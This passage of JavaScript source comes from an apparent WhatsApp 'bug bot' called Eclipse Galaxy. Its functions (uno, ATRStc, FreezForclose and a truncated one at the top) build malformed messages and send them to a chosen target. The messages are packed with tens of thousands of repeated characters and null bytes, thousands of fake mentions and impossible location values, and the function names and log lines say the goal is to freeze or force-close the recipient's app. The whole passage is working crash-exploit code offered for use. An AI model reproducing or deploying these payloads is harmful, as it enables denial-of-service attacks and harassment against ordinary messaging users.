                name: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶",
                address: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶",
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "\n",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: buttonpush,
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              }
            }
          }
        }
      }
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}

async function uno(target) {
     const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "AYAM" + "ោ៝".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "DRAPOK",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -929.03499999999999,
                                degreesLongitude: 992.999999999999,
                                name: "ZERO",
                                address: "ោ៝".repeat(1000),
                            },
                        },
                        body: {
                            text: "HELLO".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

async function ATRStc(sock, target) { 
  const freez = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦽ".repeat(45000),
      publisher: " ATR - FREEZ G BG",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: " ATR - FREEZ G BG ",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  await sock.relayMessage(target, freez, {
    participant: { jid: target }
  });

  console.log(" BANG SUCCES NIH BG ");
}

async function FreezForclose(sock, target) {
  let msg = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " —#Leamor Zunn - Tra4sh " + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/zunncrash",
      contextInfo: {
        statusAttributionType: 2,
        isForwarded: true,
        forwardingScore: 999999,
        mentionedJid: Array.from(
          { length: 1900 },
          (_, i) => `1313555000${i + 1}@s.whatsapp.net`
        )
      },
      streamingSidecar: "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
      thumbnailDirectPath: "/v/t62.36147-24/531652303_1341445584346193",
      thumbnailSha256: Buffer.from("XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=", "base64"),
      thumbnailEncSha256: Buffer.from("B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=", "base64"),
      annotations: [
        {
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              songId: "1221313878044460",
              author: " — Leamor Zunn ",
              title: "Forclose Freez",
              countryBlocklist: ["+62"],
              isExplicit: true
            }
          }
        }
      ]
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log(chalk.bold.blue("Forclose Freez"));
}
// ========== FUNGSI BUG YANG BELUM DIDEKLARASIKAN ==========

// Load auto update config saat start
loadAutoUpdateConfig();

// ========== JALANKAN BOT ==========
console.log("Eclipse Galaxy is running...");